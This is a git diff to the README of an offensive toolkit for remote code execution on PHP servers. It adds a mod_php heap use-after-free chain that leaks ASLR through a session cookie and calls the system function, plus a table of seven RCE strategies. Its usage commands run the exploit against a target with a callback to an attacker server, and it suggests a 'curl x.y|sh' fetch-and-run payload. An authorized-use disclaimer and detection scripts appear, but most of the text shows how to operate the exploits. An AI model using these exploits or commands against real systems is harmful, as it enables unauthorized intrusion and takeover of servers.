@@ -14,6 +14,7 @@ tools, technical documentation, and hands-on practice labs:
 |-------|------|----------|-------------------|------|
 | **Session File Inclusion** | `p2s.py` | OOM → persist session file → LFI/deser | Yes (LFI or gadget) | PHP-FPM, mod_php |
 | **Heap UAF** | `edb-52704.py` | 2-stage ASLR leak → fake struct → hijack pDestructor | **No** | mod_php prefork |
+| **Heap UAF 128M** | `oracle-exploit/` | Cookie-based ASLR leak → heap spray → zif_system | **No** | mod_php (production defaults) |
 
 > **Authorized use only.** These tools are for authorized penetration testing,
 > security research, and CTF/lab practice. Do not use against systems you do not
@@ -29,6 +30,7 @@ tools, technical documentation, and hands-on practice labs:
   - [Session File Inclusion Perspective](#session-file-inclusion-perspective)
   - [Attack Chain: SFI](#attack-chain-session-file-inclusion)
   - [Attack Chain: Heap UAF](#attack-chain-heap-uaf-exploitation)
+  - [Attack Chain: Heap UAF 128M](#oracle-exploit--heap-chain-for-production-defaults)
 - [Exploitation Approaches](#exploitation-approaches)
 - [Repository Structure](#repository-structure)
 - [Quick Start](#quick-start)
@@ -206,8 +208,13 @@ the other cannot:
 ```
 php2shell/
 ├── README.md                  # this file
-├── p2s.py                     # SFI chain: unified scanner + exploit
+├── p2s.py                     # SFI chain: unified scanner + exploit (7 chains)
 ├── edb-52704.py               # Heap UAF chain: OffSec 3-stage exploit
+├── oracle-exploit/            # Oracle-Security mod_php 128M heap chain
+│   ├── exploit.py             # ASLR bypass via cookie leak + zif_system RCE
+│   ├── offsets.py             # ELF offset extractor for libphp.so
+│   ├── serve.py               # proof-of-execution callback server
+│   └── README.md
 ├── detect_php2shell.py        # safe version-based detection (1 GET)
 ├── detect_behavioral.py       # behavioral detection (no version headers needed)
 ├── php2shell.py               # godylockz original exploit (mod_php/Apache)
@@ -366,13 +373,17 @@ The unified scanner + exploit. Zero dependencies (Python 3.8+ stdlib only).
 | RCE | `--rce` | Multi-strategy RCE attempt |
 | Bulk scan | `-f targets.txt` | Parallel fingerprinting |
 
-#### RCE Strategies
+#### RCE Chains (7 strategies, auto-selected by SAPI)
 
-| Strategy | Name | Mechanism | Requirements |
-|----------|------|-----------|-------------|
-| A | OOM + LFI | OOM prevents cleanup → LFI includes session file | `post_max_size > memory_limit` + LFI |
-| B | Race + LFI | Slow-drip upload keeps session alive → race LFI | Any body limit + LFI |
-| C | Heap exploit | Per-build offset UAF → control flow hijack | Matching offset profile |
+| ID | Name | Mechanism | Requirements |
+|----|------|-----------|-------------|
+| `sfi` | SFI + LFI | Session file injection → LFI include | upload_progress=On + LFI sink |
+| `sfi_oom` | SFI + OOM + LFI | OOM prevents cleanup → LFI includes session | + body > memory_limit |
+| `race` | Race + LFI | Slow-drip upload keeps session alive → race LFI | upload_progress + LFI + timing |
+| `modphp` | mod_php heap (godylockz) | Heap UAF → zif_system | mod_php + display_errors=On + low mem |
+| `modphp128` | mod_php heap 128M (Oracle) | Cookie ASLR leak → heap spray → zif_system | mod_php + production defaults |
+| `mismatch` | Handler mismatch deser | serialize_handler mismatch → deserialization | Two dirs with different handlers |
+| `fpm` | FPM heap | FPM-specific offset-based heap exploit | FPM + per-build offset profile |
 
 ```bash
 python3 p2s.py https://target.example/ --rce -c 'id;hostname' --allow-remote
@@ -423,6 +434,42 @@ trigger (e.g., write a script first, then `sh</out/c`).
 
 See [docs/heap-exploitation.md](docs/heap-exploitation.md) for the full
 technical walkthrough.
+
+### oracle-exploit/ — Heap Chain for Production Defaults
+
+Oracle-Security's mod_php heap chain works with **real-world production defaults**:
+`display_errors=Off` + `memory_limit=128M` — the configuration edb-52704 cannot reach.
+
+#### How it differs from edb-52704
+
+| Aspect | edb-52704 | oracle-exploit |
+|--------|-----------|----------------|
+| `display_errors` | Must be `On` (leak via error page) | Works with `Off` (leak via PHPSESSID cookie) |
+| `memory_limit` | 8M (tight heap layout) | 128M (production default) |
+| ASLR bypass | Heap → libphp from error page | ~600KB freed memory disclosed in cookie value |
+| Offset source | Pre-extracted profiles | `offsets.py` extracts from live `libphp.so` ELF |
+
+#### Usage
+
+```bash
+# Extract offsets from target's libphp.so
+python3 oracle-exploit/offsets.py /path/to/libphp.so
+
+# Exploit with proof-of-execution callback
+python3 oracle-exploit/exploit.py \
+  --url http://target/index.php \
+  --cmd 'id' \
+  --proof-url http://YOUR_SERVER/proof \
+  --expect uid= \
+  --verbose
+
+# Start the proof callback listener
+python3 oracle-exploit/serve.py --port 8888
+```
+
+**Command limit:** 14 bytes (same as edb-52704). For longer payloads: `curl x.y|sh`.
+
+Source: [Oracle-Security/CVEs](https://github.com/Oracle-Security/CVEs/tree/main/WordPress/PHP2Shell)
 
 ---
 
